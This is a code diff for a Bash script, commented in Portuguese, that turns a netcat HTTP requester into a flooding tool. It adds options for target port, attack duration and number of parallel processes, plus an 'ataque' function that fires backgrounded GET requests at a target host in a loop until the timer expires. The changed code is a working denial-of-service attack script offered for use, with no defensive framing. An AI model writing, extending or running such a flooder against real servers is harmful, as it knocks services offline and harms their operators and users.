@@ -90,7 +90,7 @@ exibe_uso() {
 requisitar() {
     local host=$1
     local port=$2
-    echo -ne "GET / HTTP/1.1\r\nHost: $host\r\n\r\n" | nc $host $port
+    echo -ne "GET / HTTP/1.1\r\nHost: $host\r\n\r\n" | nc -vq 1 $host $port
 }
 
 # Valida se ip é valido (IPv4)
@@ -124,11 +124,22 @@ menu_check() {
 
     while [[ -n $1 ]]; do
         case "$1" in
+	-p|--port)
+	    shift
+	    [[ "$1" -ge 1  ]] && porta_alvo="$1" 
+	;;
+	-t|--time)
+	    shift
+	    [[ "$1" -gt 0 ]] && tempo_ataque="$1"
+	    ;;
+	-c|--childs)
+	    shift
+	    [[ "$1" -gt 0 ]] && threads_atual="$1"
+	    ;;
         -host)
             shift
             if validar_host "$1"; then
                 host_alvo="$1"
-                shift
             else
                 msg_erro "Host: \"$1\" inválido!"
                 return 1
@@ -137,19 +148,19 @@ menu_check() {
         -d | --debug) set -x ;;
         -h | --help)
             exibe_uso
-            return 0
+            exit 0
             ;;
         --change-log)
             exibe_hist
-            return 0
+            exit 0
             ;;
         --show)
             exibe_licen
-            return 0
+            exit 0
             ;;
         -v | --version)
             exibe_versao
-            return 0
+            exit 0
             ;;
         *)
             msg_erro "Paramêtro fornecido: \"$1\", invalido!"
@@ -161,13 +172,27 @@ menu_check() {
     return 0
 }
 
+ataque(){
+    local controle=0 # Variavel de controle.
+    local host="$1"
+    local port="$2"
+    local t_ataque="$3"
+    local t_final="$((SECONDS+t_ataque))"
+
+    while [[ SECONDS -lt t_final  ]]; do
+       requisitar $host $port  &
+       ((controle++))
+       if [[ "$controle" -ge "$threads_atual" ]]; then
+          wait -n # Espera até que uma termine
+	  ((controle--))
+       fi
+    done
+}
+
 main() {
-    menu_check $@ || exit 1
-
-    [[ $debug_flag -eq 1 ]] && {
-        set -x
-    }
-
+    menu_check $@ || exit 1 
+    ataque $host_alvo $porta_alvo "$tempo_ataque"
+    wait # Aguarda que todod terminem
     return 0
 }
 
